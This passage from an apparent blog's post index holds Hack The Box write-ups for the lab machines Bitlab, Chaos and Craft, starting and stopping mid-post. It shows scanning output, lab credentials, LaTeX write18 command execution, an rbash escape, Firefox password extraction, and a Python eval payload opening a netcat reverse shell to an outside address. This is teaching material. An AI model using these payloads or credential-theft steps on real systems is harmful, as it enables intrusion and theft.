postgres=CTc/postgres+ | | | | | | | | gitlab=CTc/postgres postgres | postgres | UTF8 | libc | C | C | | | profiles | postgres | UTF8 | libc | C | C | | | =Tc/postgres + | | | | | | | | postgres=CTc/postgres+ | | | | | | | | profiles=CTc/postgres template0 | postgres | UTF8 | libc | C | C | | | =c/postgres + | | | | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | libc | C | C | | | =c/postgres + | | | | | | | | postgres=CTc/postgres (5 rows) Dump the database profiles=\u0026gt; \\d List of relations Schema | Name | Type | Owner --------+----------+-------+---------- public | profiles | table | profiles (1 row) profiles=\u0026gt; select * from profiles; id | username | password ----+----------+------------------------ 1 | clave | c3NoLXN0cjBuZy1wQHNz== (1 row) We can ssh └─$ sshpass -p \u0026#39;c3NoLXN0cjBuZy1wQHNz==\u0026#39; ssh clave@10.10.10.114 Warning: Permanently added \u0026#39;10.10.10.114\u0026#39; (ED25519) to the list of known hosts. Last login: Thu Aug 8 14:40:09 2019 clave@bitlab:~$ Root Interesting file RemoteConnection.exe clave@bitlab:~$ ls -lha total 44K drwxr-xr-x 4 clave clave 4.0K Aug 8 2019 . drwxr-xr-x 3 root root 4.0K Feb 28 2019 .. lrwxrwxrwx 1 root root 9 Feb 28 2019 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 clave clave 3.7K Feb 28 2019 .bashrc drwx------ 2 clave clave 4.0K Aug 8 2019 .cache drwx------ 3 clave clave 4.0K Aug 8 2019 .gnupg -rw-r--r-- 1 clave clave 807 Feb 28 2019 .profile -r-------- 1 clave clave 14K Jul 30 2019 RemoteConnection.exe -r-------- 1 clave clave 33 Oct 26 17:02 user.txt Supply it to strings ... ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS parse Access Denied !! string too long invalid string position GetUserNameW ADVAPI32.dll ShellExecuteW SHELL32.dll ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ?_Xout_of_range@std@@YAXPBD@Z ?_Xlength_error@std@@YAXPBD@Z ?uncaught_exception@std@@YA_NXZ ?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z ?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ ?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z ?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z MSVCP100.dll ?what@exception@std@@UBEPBDXZ ... Let\u0026rsquo;s reverse it Looks like it deploys Putty as clave Use x32dbg to debug Set breakpoint in the main function I set it right before the check for username clave And we have a password for root root:Qf7]8YSV.wDNF*[7d?j\u0026amp;eD4^ ssh as root └─$ sshpass -p \u0026#39;Qf7]8YSV.wDNF*[7d?j\u0026amp;eD4^\u0026#39; ssh root@10.10.10.114 Last login: Wed Sep 7 13:12:33 2022 root@bitlab:~# ","date":"October 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bitlab/images/bitlab.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bitlab/","summary":"Bitlab Enumeration nmap └─$ nmap -Pn -p- 10.10.10.114 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 18:31 BST Nmap scan report for 10.10.10.114 (10.10.10.114) Host is up (0.27s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 127.78 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.114 --min-rate 5000 Starting Nmap 7.","tags":["HTB","bookmark","javascript","obfuscation","webshell","git","gitlab","docker","ping-sweep","chisel","tunnel","ligolo-ng","psql","ssh","reverse-engineering","ida","x64dbg","git-hooks","reverse-engineering"],"title":"[HTB] Machine: Bitlab"},{"categories":null,"contents":"Chaos Enumeration nmap └─$ nmap -Pn -p- 10.10.10.120 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 17:06 BST Stats: 0:11:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 60.89% done; ETC: 17:25 (0:07:32 remaining) Nmap scan report for 10.10.10.120 (10.10.10.120) Host is up (0.28s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 110/tcp open pop3 143/tcp open imap 993/tcp open imaps 995/tcp open pop3s 10000/tcp open snet-sensor-mgmt 63322/tcp filtered unknown └─$ nmap -Pn -p80,110,143,993,995,10000 -sC -sV 10.10.10.120 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 14:38 GMT Nmap scan report for 10.10.10.120 (10.10.10.120) Host is up (0.30s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.34 ((Ubuntu)) |_http-server-header: Apache/2.4.34 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 110/tcp open pop3 Dovecot pop3d |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=chaos | Subject Alternative Name: DNS:chaos | Not valid before: 2018-10-28T10:01:49 |_Not valid after: 2028-10-25T10:01:49 |_pop3-capabilities: TOP SASL UIDL CAPA AUTH-RESP-CODE PIPELINING STLS RESP-CODES 143/tcp open imap Dovecot imapd (Ubuntu) |_imap-capabilities: ENABLE capabilities SASL-IR IDLE STARTTLS listed LITERAL+ ID post-login IMAP4rev1 more Pre-login LOGIN-REFERRALS OK LOGINDISABLEDA0001 have | ssl-cert: Subject: commonName=chaos | Subject Alternative Name: DNS:chaos | Not valid before: 2018-10-28T10:01:49 |_Not valid after: 2028-10-25T10:01:49 |_ssl-date: TLS randomness does not represent time 993/tcp open ssl/imap Dovecot imapd (Ubuntu) |_imap-capabilities: ENABLE SASL-IR IDLE post-login listed LITERAL+ ID AUTH=PLAINA0001 IMAP4rev1 more capabilities LOGIN-REFERRALS Pre-login OK have |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=chaos | Subject Alternative Name: DNS:chaos | Not valid before: 2018-10-28T10:01:49 |_Not valid after: 2028-10-25T10:01:49 995/tcp open ssl/pop3 Dovecot pop3d |_pop3-capabilities: TOP SASL(PLAIN) UIDL CAPA USER PIPELINING AUTH-RESP-CODE RESP-CODES |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=chaos | Subject Alternative Name: DNS:chaos | Not valid before: 2018-10-28T10:01:49 |_Not valid after: 2028-10-25T10:01:49 10000/tcp open http MiniServ 1.890 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 51.86 seconds Web server Port 10000 gobuster └─$ gobuster dir -u http://chaos.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://chaos.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 288] /.html (Status: 403) [Size: 289] /index.html (Status: 200) [Size: 6964] /contact.html (Status: 200) [Size: 4615] /about.html (Status: 200) [Size: 5532] /blog.html (Status: 200) [Size: 46] /img (Status: 301) [Size: 304] [--\u0026gt; http://chaos.htb/img/] /css (Status: 301) [Size: 304] [--\u0026gt; http://chaos.htb/css/] /source (Status: 301) [Size: 307] [--\u0026gt; http://chaos.htb/source/] /js (Status: 301) [Size: 303] [--\u0026gt; http://chaos.htb/js/] /javascript (Status: 301) [Size: 311] [--\u0026gt; http://chaos.htb/javascript/] └─$ gobuster dir -u http://10.10.10.120/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.120/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: html,js,php,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 73] /.html (Status: 403) [Size: 292] /.php (Status: 403) [Size: 291] /wp (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.120/wp/] /javascript (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.120/javascript/] Wordpress └─$ wpscan --url http://10.10.10.120/wp/wordpress/ -e u,p _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://10.10.10.120/wp/wordpress/ [10.10.10.120] [+] Started: Sun Oct 29 15:16:25 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.34 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.120/wp/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.10.120/wp/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.120/wp/wordpress/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02). | Found By: Rss Generator (Passive Detection) | - http://10.10.10.120/wp/wordpress/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.9.8\u0026lt;/generator\u0026gt; | - http://10.10.10.120/wp/wordpress/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.9.8\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.9.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.7 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: \u0026#39;Version: 1.7\u0026#39; [+] Enumerating Most Popular Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:04 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:04 [i] User(s) Identified: [+] human | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://10.10.10.120/wp/wordpress/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Oct 29 15:16:45 2023 [+] Requests Done: 55 [+] Cached Requests: 7 [+] Data Sent: 15.173 KB [+] Data Received: 460.928 KB [+] Memory used: 245.84 MB [+] Elapsed time: 00:00:20 vhosts └─$ wfuzz -u http://10.10.10.120/ -H \u0026#39;Host: FUZZ.chaos.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 73 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.120/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000005: 200 120 L 386 W 5607 Ch \u0026#34;webmail\u0026#34; 000009532: 400 12 L 53 W 442 Ch \u0026#34;#www\u0026#34; 000010581: 400 12 L 53 W 442 Ch \u0026#34;#mail\u0026#34; Total time: 523.4830 Processed Requests: 19966 Filtered Requests: 19963 Requests/sec.: 38.14068 webmail.chaos.htb Foothold We can see a post on wordpress named chaos created by human user It\u0026rsquo;s password protected human as password works to open in We have creds for webmail ayush:jiujitsu Now we can login to webmail.chaos.htb But inbox is empty Yet, we have a message in drafts It contains a message and a script which was used to encrypt the message The same information could be retrieved via imap/evolution https://www.atmail.com/blog/imap-commands/ https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap#evolution en.py └─$ cat en.py def encrypt(key, filename): chunksize = 64*1024 outputFile = \u0026#34;en\u0026#34; + filename filesize = str(os.path.getsize(filename)).zfill(16) IV =Random.new().read(16) encryptor = AES.new(key, AES.MODE_CBC, IV) with open(filename, \u0026#39;rb\u0026#39;) as infile: with open(outputFile, \u0026#39;wb\u0026#39;) as outfile: outfile.write(filesize.encode(\u0026#39;utf-8\u0026#39;)) outfile.write(IV) while True: chunk = infile.read(chunksize) if len(chunk) == 0: break elif len(chunk) % 16 != 0: chunk += b\u0026#39; \u0026#39; * (16 - (len(chunk) % 16)) outfile.write(encryptor.encrypt(chunk)) def getKey(password): hasher = SHA256.new(password.encode(\u0026#39;utf-8\u0026#39;)) return hasher.digest() The password is sahay, since the message said You are the password XD I\u0026rsquo;ll create a script which reverses the encrypt function └─$ cat dec.py import os from Crypto import Random from Crypto.Cipher import AES from Crypto.Hash import SHA256 def decrypt(key, filename): chunksize = 64*1024 with open(filename, \u0026#39;rb\u0026#39;) as infile: filesize = int(infile.read(16)) IV = infile.read(16) decryptor = AES.new(key, AES.MODE_CBC, IV) chunk = infile.read(chunksize) if len(chunk) \u0026gt; 0: print(decryptor.decrypt(chunk)) def getKey(password): hasher = SHA256.new(password.encode(\u0026#39;utf-8\u0026#39;)) return hasher.digest() decrypt(getKey(\u0026#34;sahay\u0026#34;), \u0026#34;enim_msg.txt\u0026#34;) Run it └─$ python3 dec.py b\u0026#39;SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK\\n\\n \u0026#39; └─$ echo \u0026#34;SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK\u0026#34; | base64 -d Hii Sahay Please check our new service which create pdf p.s - As you told me to encrypt important msg, i did :) http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3 Thanks, Ayush http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3 If we test a request, we see it\u0026rsquo;s a LaTex The template test1 fails, but test2 and test3 are successful We can try to perform rce https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection#command-execution We saw a message This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex) \\write18 enabled. We can try \\immediate\\write18{\u0026lt;CMD\u0026gt;} Let\u0026rsquo;s get a reverse shell Don\u0026rsquo;t forget to url-encode User We can su as ayush, since we have creds www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ su - ayush Password: ayush@chaos:~$ But it looks like we are inside rbash ayush@chaos:~$ ls Command \u0026#39;ls\u0026#39; is available in \u0026#39;/bin/ls\u0026#39; The command could not be located because \u0026#39;/bin\u0026#39; is not included in the PATH environment variable. ls: command not found ayush@chaos:~$ ayush@chaos:~$ echo $SHELL /opt/rbash ayush@chaos:~$ echo $PATH /home/ayush/.app ayush@chaos:~$ env Command \u0026#39;env\u0026#39; is available in \u0026#39;/usr/bin/env\u0026#39; The command could not be located because \u0026#39;/usr/bin\u0026#39; is not included in the PATH environment variable. env: command not found ayush@chaos:~$ export declare -x HOME=\u0026#34;/home/ayush\u0026#34; declare -x LANG=\u0026#34;en_US.UTF-8\u0026#34; declare -x LOGNAME=\u0026#34;ayush\u0026#34; declare -x MAIL=\u0026#34;/var/mail/ayush\u0026#34; declare -x OLDPWD declare -x PATH=\u0026#34;/home/ayush/.app\u0026#34; declare -x PWD=\u0026#34;/home/ayush\u0026#34; declare -x SHELL=\u0026#34;/opt/rbash\u0026#34; declare -x SHLVL=\u0026#34;1\u0026#34; declare -x TERM=\u0026#34;xterm\u0026#34; declare -x USER=\u0026#34;ayush\u0026#34; declare -x XDG_RUNTIME_DIR=\u0026#34;/run/user/1001\u0026#34; declare -x XDG_SESSION_ID=\u0026#34;c1\u0026#34; ayush@chaos:~$ The list of commands we can run cd is blocked, I tried dir ayush@chaos:~$ dir /home/ayush/.app/ dir ping tar We can escape using GTFOBins ayush@chaos:~$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash tar: Removing leading `/\u0026#39; from member names bash: groups: command not found ayush@chaos:~$ whoami Command \u0026#39;whoami\u0026#39; is available in \u0026#39;/usr/bin/whoami\u0026#39; The command could not be located because \u0026#39;/usr/bin\u0026#39; is not included in the PATH environment variable. whoami: command not found ayush@chaos:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ayush@chaos:~$ ls mail user.txt ayush@chaos:~$ Root I notice .mozilla directory in ayush\u0026rsquo;s home directory ayush@chaos:~$ ls -lha total 40K drwx------ 6 ayush ayush 4.0K Oct 29 16:41 . drwxr-xr-x 4 root root 4.0K Jun 30 2022 .. drwxr-xr-x 2 root root 4.0K Jun 30 2022 .app lrwxrwxrwx 1 root root 9 Jul 12 2022 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ayush ayush 220 Oct 28 2018 .bash_logout -rwxr-xr-x 1 root root 22 Oct 28 2018 .bashrc drwx------ 3 ayush ayush 4.0K Oct 29 16:41 .gnupg drwx------ 3 ayush ayush 4.0K Oct 29 16:18 mail drwx------ 4 ayush ayush 4.0K Jun 30 2022 .mozilla -rw-r--r-- 1 ayush ayush 807 Oct 28 2018 .profile -rw------- 1 ayush ayush 33 Oct 29 14:28 user.txt We have a profile ayush@chaos:~/.mozilla/firefox$ ls bzo7sjt1.default \u0026#39;Crash Reports\u0026#39; profiles.ini Let\u0026rsquo;s extract data I had to download version 0.7.0 of the firefox_decrypt ayush@chaos:~$ python3 firefox_decrypt.py Master Password for profile /home/ayush/.mozilla/firefox/bzo7sjt1.default: Website: https://chaos.htb:10000 Username: \u0026#39;root\u0026#39; Password: \u0026#39;Thiv8wrej~\u0026#39; And we can grab our root flag ayush@chaos:~$ su - Password: root@chaos:~# ","date":"October 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/chaos/images/chaos.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/chaos/","summary":"Chaos Enumeration nmap └─$ nmap -Pn -p- 10.10.10.120 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 17:06 BST Stats: 0:11:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 60.89% done; ETC: 17:25 (0:07:32 remaining) Nmap scan report for 10.10.10.120 (10.10.10.120) Host is up (0.28s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 110/tcp open pop3 143/tcp open imap 993/tcp open imaps 995/tcp open pop3s 10000/tcp open snet-sensor-mgmt 63322/tcp filtered unknown └─$ nmap -Pn -p80,110,143,993,995,10000 -sC -sV 10.","tags":["HTB","webmin","wordpress","wpscan","imap","evolution","openssl","roundcube","wfuzz","crypto","python","latex","pdftex","rbash","gtfobins","tar","firefox"],"title":"[HTB] Machine: Chaos"},{"categories":null,"contents":"Craft Enumeration nmap └─$ nmap -Pn -p- 10.10.10.110 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:34 BST Warning: 10.10.10.110 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.110 (10.10.10.110) Host is up (0.19s latency). Not shown: 39240 filtered tcp ports (no-response), 26293 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 6022/tcp open x11 Nmap done: 1 IP address (1 host up) scanned in 100.87 seconds └─$ nmap -Pn -p22,443,6022 -sC -sV 10.10.10.110 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:37 BST Nmap scan report for 10.10.10.110 (10.10.10.110) Host is up (0.43s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 | tls-nextprotoneg: |_ http/1.1 | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 |_http-title: About | tls-alpn: |_ http/1.1 |_http-server-header: nginx/1.15.8 |_ssl-date: TLS randomness does not represent time 6022/tcp open ssh (protocol 2.0) | ssh-hostkey: |_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA) | fingerprint-strings: | NULL: |_ SSH-2.0-Go 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port6022-TCP:V=7.94%I=7%D=10/26%Time=653AB201%P=x86_64-pc-linux-gnu%r(N SF:ULL,C,\u0026#34;SSH-2\\.0-Go\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.33 seconds Web server We have links to: gogs.craft.htb and api.craft.htb/api vhosts └─$ wfuzz -u https://craft.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.craft.htb\u0026#39; --hw 268 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: https://craft.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000051: 404 4 L 34 W 233 Ch \u0026#34;api\u0026#34; 000005934: 404 1 L 4 W 19 Ch \u0026#34;vault\u0026#34; Foothold vault.craft.htb └─$ curl -s -k https://vault.craft.htb 404 page not found gobuster └─$ gobuster dir -u https://vault.craft.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 50 -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://vault.craft.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /v1 (Status: 301) [Size: 39] [--\u0026gt; /v1/] └─$ gobuster dir -u https://vault.craft.htb/v1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x -t 50 -k --exclude-length 36 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://vault.craft.htb/v1 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 36 [+] User Agent: gobuster/3.6 [+] Extensions: -t [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /sys (Status: 301) [Size: 43] [--\u0026gt; /v1/sys/] Endpoints point nowhere yet, I\u0026rsquo;ll skip vault and check api endpoint └─$ curl -s -k https://vault.craft.htb/v1/ {\u0026#34;errors\u0026#34;:[]} └─$ curl -s -k https://vault.craft.htb/v1/sys/ {\u0026#34;errors\u0026#34;:[\u0026#34;missing client token\u0026#34;]} api.craft.htb api.craft.htb/api looks interesting Majority of endpoints respond with 403 { \u0026#34;message\u0026#34;: \u0026#34;Invalid token or no token found.\u0026#34; } /auth/login returns in http basic auth window gogs.craft.htb has a repo and usernames we could use Let\u0026rsquo;s check craft-api repo There\u0026rsquo;s an issue which uses eval function We also have test.py which logins with empty creds https://gogs.craft.htb/Craft/craft-api/src/master/tests/test.py But if we look at the file history, we find dinesh\u0026rsquo;s creds dinesh:4aUh0A8PbVJxgd We can confirm that the creds work by running test.py └─$ python2.7 test.py | grep -v \u0026#34;InsecureRequestWarning:\u0026#34; /usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host \u0026#39;api.craft.htb\u0026#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings /usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host \u0026#39;api.craft.htb\u0026#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings /usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host \u0026#39;api.craft.htb\u0026#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings /usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host \u0026#39;api.craft.htb\u0026#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings {\u0026#34;message\u0026#34;:\u0026#34;Token is valid!\u0026#34;} Create bogus ABV brew \u0026#34;ABV must be a decimal value less than 1.0\u0026#34; Create real ABV brew null Since now we can get our token, and we control input for eval function we saw at brew endpoint Let\u0026rsquo;s play around with it https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/ __import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.4 6666 \u0026gt;/tmp/f') GNU nano 7.2 test.py * #!/usr/bin/env python import requests import json response = requests.get(\u0026#39;https://api.craft.htb/api/auth/login\u0026#39;, auth=(\u0026#39;dinesh\u0026#39;, \u0026#39;4aUh0A8PbVJxgd\u0026#39;), verify=False) json_response = json.loads(response.text) token = json_response[\u0026#39;token\u0026#39;] headers = { \u0026#39;X-Craft-API-Token\u0026#39;: token, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } # make sure token is valid response = requests.get(\u0026#39;https://api.craft.htb/api/auth/check\u0026#39;, headers=headers, verify=False) print(response.text) # create a 